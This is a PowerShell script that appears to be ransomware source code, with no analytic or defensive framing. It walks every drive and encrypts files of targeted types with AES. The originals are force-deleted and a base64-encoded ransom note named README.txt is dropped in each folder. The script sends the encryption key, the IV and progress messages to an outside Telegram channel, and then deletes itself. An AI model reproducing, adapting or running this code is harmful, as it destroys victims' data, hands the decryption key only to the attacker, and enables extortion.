function Encrypt-File {
    param (
        [string]$filePath,
        [byte[]]$key,
        [byte[]]$iv
    )

    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.IV = $iv

        $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)

        [byte[]]$fileContent = [System.IO.File]::ReadAllBytes($filePath)

        $memoryStream = New-Object System.IO.MemoryStream
        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

        $cryptoStream.Write($fileContent, 0, $fileContent.Length)
        $cryptoStream.FlushFinalBlock()

        $encryptedContent = $memoryStream.ToArray()

        $newFilePath = $filePath + ".crypted"
        [System.IO.File]::WriteAllBytes($newFilePath, $encryptedContent)

        $cryptoStream.Close()
        $memoryStream.Close()
        $aes.Dispose()

        Write-Output "File encrypted: $filePath"
        Remove-Item -Path $filePath -Force
		
    } catch {
        Write-Error "Error encrypting file ${filePath}: $_"
    }
}

function Process-File {
    param (
        [string]$filePath,
        [byte[]]$key,
        [byte[]]$iv
    )
    try {
        Encrypt-File -filePath $filePath -key $key -iv $iv
        $directoryPath = [System.IO.Path]::GetDirectoryName($filePath)
        $ransomNotePath = [System.IO.Path]::Combine($directoryPath, "README.txt")
        if (-not (Test-Path -Path $ransomNotePath)) {
            $ransomNoteContent = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ransomNoteBase64))
            Set-Content -Path $ransomNotePath -Value $ransomNoteContent
        }
    } catch {
        Write-Error "Error processing file ${filePath}: $_"
    }
}

function Search-And-Encrypt {
    param (
        [string]$path,
        [byte[]]$key,
        [byte[]]$iv,
        [ref]$progress
    )

    try {
        $files = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue |
                 Where-Object { $_.FullName -notlike 'C:\Windows\*' -and $_.FullName -notlike 'C:\Program Files\*' }

        $totalFiles = $files.Count
        $processedFiles = 0
        $lastReportedProgress = -1

        foreach ($file in $files) {
            $extension = $file.Extension.ToLower()
            if ($fileTypes -contains "*$extension") {
                Process-File -filePath $file.FullName -key $key -iv $iv
				$processedFiles++
            }
            $currentProgress = [math]::Round(($processedFiles / $totalFiles) * 100)
            if ($currentProgress -ne $lastReportedProgress) {
                $progress.Value = $currentProgress
                $message = "$($redExclamation) Encrypting... `nDrive: $path `nProgress: $($processedFiles)/$($totalFiles)"
                Send-TelegramMessage -message $message
                $lastReportedProgress = $currentProgress
            }
        }

        $directories = Get-ChildItem -Path $path -Directory -ErrorAction SilentlyContinue |
                       Where-Object { $_.FullName -notlike 'C:\Windows\*' -and $_.FullName -notlike 'C:\Program Files\*' }

        foreach ($directory in $directories) {
            Search-And-Encrypt -path $directory.FullName -key $key -iv $iv -progress ([ref]$progress)
        }
    } catch {
        Write-Error "Error searching and encrypting: $_"
        $message = "$($redExclamation) Error searching and encrypting: $_"
		Send-TelegramMessage -message $message
    }
}



$drives = Get-WmiObject Win32_LogicalDisk | Select-Object -ExpandProperty DeviceID

function Generate-RandomKey($length) {
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $key = New-Object byte[] $length
    $rng.GetBytes($key)
    return $key
}

$key = Generate-RandomKey 32
$iv = Generate-RandomKey 16

$keyBase64 = [Convert]::ToBase64String($key)
$ivBase64 = [Convert]::ToBase64String($iv)

$message = "$($redExclamation)Encryption key: $keyBase64 `n$($redExclamation)Initialization vector: $ivBase64"
Send-TelegramMessage -message $message

foreach ($drive in $drives) {
    $progress = 0
    Search-And-Encrypt -path $drive -key $key -iv $iv -progress ([ref]$progress)
}

$message = "$($redExclamation)Encryption finish"
Send-TelegramMessage -message $message
$scriptPath = $MyInvocation.MyCommand.Path
Start-Sleep -Seconds 2
Remove-Item $scriptPath -Force
